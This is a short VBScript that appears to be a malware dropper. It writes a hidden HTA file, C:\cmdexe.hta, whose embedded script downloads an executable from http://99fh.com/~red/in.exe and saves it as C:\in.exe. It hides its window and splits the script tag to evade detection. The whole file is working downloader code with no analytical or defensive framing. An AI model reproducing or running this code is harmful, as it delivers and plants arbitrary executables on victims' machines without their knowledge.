on error resume next
set evan = CreateObject("ADODB.Recordset")
	With evan
		.Fields.Append "evan", 200, "3000"
		Call .Open
		Call .AddNew
		.Fields("evan").Value = "<body style=display:none scroll=no><script language=vbscript>: self.MoveTo 10000,10000 : on error resume next : set o = CreateObject(""msxml2.XML" + "HTTP"") : o.open ""GET"",""http://99fh.com/~red/in.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\in.exe"",2 : window.close()</scr"+"ipt>"
		Call .Update
	End With
evan.Save "C:\cmdexe.hta", adPersistXML
evan.Close
